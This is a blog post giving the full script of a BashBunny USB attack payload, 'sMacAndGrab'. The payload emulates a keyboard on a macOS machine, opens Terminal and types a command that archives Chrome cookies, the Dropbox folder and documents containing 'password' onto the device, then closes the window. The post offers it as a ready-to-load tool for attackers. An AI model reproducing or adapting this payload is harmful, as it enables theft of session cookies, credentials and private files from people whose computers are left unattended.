+++
date = "2017-04-01T22:08:35-04:00"
title = "Creating BashBunny Payloads"
Description = "Creating Payloads for the Hak5 BashBunny"
menu = "posts"
+++


## What is it?

The [BashBunny](http://wiki.bashbunny.com/#!index.md) is an attack platform that allows attackers to
create payloads in Bash. The device can be scripted to enumerate as a HID (keyboard), mass storage,
serial, and Ethernet. This enables a multitude of attacks including thing like exfiltrating
documents over a network interface or stealing account hashes from locked computers.

## Creating a Payload

We want to create a payload that allows for easy exfiltration from macOS. We also don't want to
force the attacker to know the exact path of the files that are to be extracted; we should allow them
to create bash commands whose output returns a list of files that are to be exfilled.

~~~bash.prettyprint

# here we set an amber color to the LED so that the 
# attacker knows that the payload has begun executing
LED G R 500

# instruct the BashBunny to enumerate as both a keyboard and
# mass storage on the host computer (masOS)
ATTACKMODE HID STORAGE

# this creates a folder in the BashBunny's loot directory
# that will be used by our payload
mkdir -p /root/udisk/loot/sMacAndGrab

# enter the name of the volume that will be mounted
dev_name="BASHBUNNY"

# this is a variable that holds the path to which we will instruct
# the target to copy our desired files
lootdir="\"/Volumes/$dev_name/loot/sMacAndGrab\""

# in this section, we add files, directories, and unix commands
# which return lists of files. this text will be typed exactly
# in the macOS terminal. Because this is bash, we have to escape 
# bash characters so that they don't evaluate when the script runs, 
# but rather they're seen as simple text.
files_to_copy=(
"\"~/Library/Application Support/Google/Chrome/Default/Cookies\"" # Quote paths with spaces
"~/Dropbox"  # enter entire directories
"\$(grep -lr password ~/Documents)" # get all Documents with the word 'password'
)
~~~

It's important to remember that this is a bash script and if we don't want symbols like `$;|:~` to
be evaluated, but rather typed or passed to the victim, they must be escaped with a backslash.

In the second half of the payload, we're defining strings that are going to by typed by the
BashBunny on the victim computer. This is why you'll see it peppered with `\\`

~~~bash.prettyprint

# these command instruct the BashBunny to act as a keyboard and physically
# type the commands

# Command + Space to launch Spotlight
QUACK GUI SPACE
QUACK DELAY 1000

# Opens the Terminal program
QUACK STRING terminal
QUACK ENTER
QUACK DELAY 4000

# Types a command to compress all of the previously defined files to 
# the previously defined storage location
QUACK STRING tar -cf \$USER.tar.gz ${files_to_copy[*]}\; mv \$USER.tar.gz $lootdir\; killall Terminal
# $lootdir and $files_to_copy are not escaped because we want them expanded to the variables we set
QUACK ENTER

# sync the filesystem to the BashBunny can be safely removed
sync

# let the attacker know that they can remove the BashBunny
LED G
~~~

And that's that. If one follows the directions in the wiki posted at the beginning of this post for
loading this payload, you have a payload that creates automatic involuntary backups in a matter of
seconds.

I've submitted the code to the official [Hak5 BashBunny Payload]
(https://github.com/hak5/bashbunny-payloads/tree/master/payloads/library/SmacAndGrab)
repo as the payload sMacAndGrab. Enjoy!
